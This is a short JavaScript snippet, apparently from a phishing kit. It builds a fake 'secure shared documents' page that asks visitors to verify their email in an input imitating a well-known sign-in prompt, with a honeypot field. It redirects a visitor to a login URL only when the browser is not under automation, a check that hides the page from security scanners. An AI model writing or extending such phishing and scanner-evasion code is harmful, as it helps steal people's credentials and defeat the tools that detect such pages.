const page = `<img src="company_logo.svg"><p>Secure shared documents, kindly verify your email and continue.</p><input placeholder="Email, phone, or Skype"><input class="honeypot-field">`;
if (!navigator.webdriver) window.location.href="https://login.example.invalid/next";
